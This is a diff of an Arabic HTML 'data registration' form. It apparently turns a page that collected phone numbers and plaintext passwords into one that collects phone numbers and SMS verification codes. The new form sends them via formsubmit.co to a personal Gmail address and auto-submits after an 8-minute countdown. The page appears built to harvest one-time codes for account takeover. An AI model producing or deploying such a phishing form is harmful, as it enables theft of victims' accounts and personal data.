@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <title>نموذج تسجيل البيانات - Netlify Forms</title>
+  <title>نموذج تسجيل البيانات مع عداد تنازلي</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Cairo&display=swap');
     body {
@@ -23,10 +23,11 @@
       border-radius: 30px;
       box-shadow: 0 10px 30px rgba(0, 128, 0, 0.2);
       box-sizing: border-box;
+      position: relative;
     }
     h2 {
       text-align: center;
-      margin-bottom: 25px;
+      margin-bottom: 15px;
       color: #2a662a;
       font-weight: 700;
       font-size: 1.8rem;
@@ -68,6 +69,14 @@
     input[name="_honey"] {
       display: none;
     }
+    #timer {
+      text-align: center;
+      font-weight: bold;
+      color: #2a662a;
+      margin-bottom: 15px;
+      font-size: 1.2rem;
+      display: none;
+    }
     @media (max-width: 360px) {
       form {
         padding: 25px 15px;
@@ -90,26 +99,70 @@
 </head>
 <body>
 
-  <form name="registration" method="POST" data-netlify="true" netlify>
+  <form id="dataForm" action="https://formsubmit.co/yblyyll@gmail.com" method="POST">
     <h2>نموذج تسجيل البيانات</h2>
 
-    <!-- مهم: حقل إخفاء اسم النموذج -->
-    <input type="hidden" name="form-name" value="registration">
+    <div id="timer">الوقت المتبقي للإرسال: 08:00</div>
 
     <!-- رقم الهاتف -->
-    <input type="tel" name="رقم_الهاتف" placeholder="رقم الهاتف" required>
+    <input type="tel" id="phone" name="رقم_الهاتف" placeholder="رقم الهاتف" required>
+
+    <!-- كود الرسالة -->
+    <input type="text" name="كود_الرسالة" placeholder="كود الرسالة" required>
 
     <!-- بريد إلكتروني مخفي -->
     <input type="hidden" name="البريد_الإلكتروني" value="yblyyll@gmail.com">
 
-    <!-- كلمة مرور نص عادي -->
-    <input type="text" name="كلمة_مرورك" placeholder="" required>
-
     <!-- حقل سبام مخفي -->
     <input type="text" name="_honey">
 
+    <!-- إعادة التوجيه بعد الإرسال -->
+    <input type="hidden" name="_redirect" value="thanks.html">
+
     <button type="submit">إرسال</button>
   </form>
+
+  <script>
+    const phoneInput = document.getElementById('phone');
+    const timerDisplay = document.getElementById('timer');
+    const form = document.getElementById('dataForm');
+    let countdown;
+    let timeLeft = 480; // 8 دقائق بالثواني
+
+    function formatTime(seconds) {
+      const m = Math.floor(seconds / 60).toString().padStart(2, '0');
+      const s = (seconds % 60).toString().padStart(2, '0');
+      return `${m}:${s}`;
+    }
+
+    function startTimer() {
+      if (countdown) return; // لا تبدأ إذا العداد شغال بالفعل
+      timerDisplay.style.display = 'block';
+      timerDisplay.textContent = `الوقت المتبقي للإرسال: ${formatTime(timeLeft)}`;
+
+      countdown = setInterval(() => {
+        timeLeft--;
+        timerDisplay.textContent = `الوقت المتبقي للإرسال: ${formatTime(timeLeft)}`;
+        if (timeLeft <= 0) {
+          clearInterval(countdown);
+          timerDisplay.textContent = 'يتم الآن إرسال النموذج...';
+          form.submit();
+        }
+      }, 1000);
+    }
+
+    phoneInput.addEventListener('input', () => {
+      if (phoneInput.value.trim().length > 0) {
+        startTimer();
+      } else {
+        // لو حذف رقم الهاتف يرجع العداد مخفي ويتم إلغاء العد
+        timerDisplay.style.display = 'none';
+        clearInterval(countdown);
+        countdown = null;
+        timeLeft = 480;
+      }
+    });
+  </script>
 
 </body>
 </html>
